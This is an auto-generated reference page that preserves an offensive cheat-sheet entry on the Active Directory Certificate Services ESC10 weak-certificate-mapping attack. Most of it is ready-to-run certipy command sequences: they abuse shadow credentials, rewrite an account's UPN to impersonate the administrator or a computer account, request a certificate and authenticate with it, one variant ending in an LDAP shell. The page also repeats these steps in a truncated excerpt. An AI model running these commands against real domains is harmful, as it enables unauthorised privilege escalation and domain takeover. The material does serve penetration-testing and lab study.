---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Active Directory - Certificate ESC10

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-ad-adcs-esc10` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adcs-esc10.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Requirements:

## Preserved Body

````markdown
## ESC10 – Weak Certificate Mapping - StrongCertificateBindingEnforcement

**Requirements**:

* `StrongCertificateBindingEnforcement` = 0.

**Exploit**:

```ps1
# get user hash with shadowcredentials
certipy shadow auto -username "user@domain.local" -p "password" -account admin -dc-ip 10.10.10.10

# change user UPN
certipy account update -username "user@domain.local" -p "password" -user admin -upn administrator -dc-ip 10.10.10.10

# ask for certificate
certipy req -username "admin@domain.local" -hashes "hashes" -target "10.10.10.10" -ca 'DOMAIN-CA' -template 'user' -debug

# Rollback upn modification
certipy account update -username "user@domain.local" -p "password" -user admin -upn admin -dc-ip 10.10.10.10

# Connect with the certificate
certipy auth -pfx 'administrator.pfx' -domain "domain.local" -dc-ip 10.10.10.10
```

## ESC10 – Weak Certificate Mapping - CertificateMappingMethods

**Requirements**:

* `CertificateMappingMethods` = 0x04.

**Exploit**:

```ps1
certipy shadow auto -username "user@domain.local" -p "password" -account admin -dc-ip 10.10.10.10

# change user UPN to computer$
certipy account update -username "user@domain.local" -p "password" -user admin -upn 'computer$@domain.local' -dc-ip 10.10.10.10

# ask for certificate
certipy req -username "admin@domain.local" -hashes "3b60abbc25770511334b3829866b08f1" -target "10.10.10.10" -ca 'DOMAIN-CA' -template 'user' -debug

# Rollback upn modification
certipy account update -username "user@domain.local" -p "password" -user admin -upn admin -dc-ip 10.10.10.10

# Connect via schannel with the certificate 
certipy auth -pfx 'computer.pfx' -domain "domain.local" -dc-ip 10.10.10.10 -ldap-shell
```

## References

* [GOAD - part 14 - ADCS 5/7/9/10/11/13/14/15 - Mayfly - March 10, 2025](https://mayfly277.github.io/posts/ADCS-part14/)
````

## Source Verification

[source record](../../sources/internalallthethings/active-directory-certificate-esc10.md)

## Evidence Excerpt

````text
_body: "# Active Directory - Certificate ESC10\n\n## ESC10 – Weak Certificate Mapping - StrongCertificateBindingEnforcement\n\
\n**Requirements**:\n\n* `StrongCertificateBindingEnforcement` = 0.\n\n**Exploit**:\n\n```ps1\n# get user hash with shadowcredentials\n\
certipy shadow auto -username \"user@domain.local\" -p \"password\" -account admin -dc-ip 10.10.10.10\n\n# change user UPN\n\
certipy account update -username \"user@domain.local\" -p \"password\" -user admin -upn administrator -dc-ip 10.10.10.10\n\
\n# ask for certificate\ncertipy req -username \"admin@domain.local\" -hashes \"hashes\" -target \"10.10.10.10\" -ca 'DOMAIN-CA'\
\ -template 'user' -debug\n\n# Rollback upn modification\ncertipy account update -username \"user@domain.local\" -p \"password\"\
\ -user admin -upn admin -dc-ip 10.10.10.10\n\n# Connect with the certificate\ncertipy auth -pfx 'administrator.pfx' -domain\
\ \"domain.local\" -dc-ip 10.10.10.10\n```\n\n## ESC10 – Weak Certificate Mapping - CertificateMappingMethods\n\n**Requirements**:\n\
````
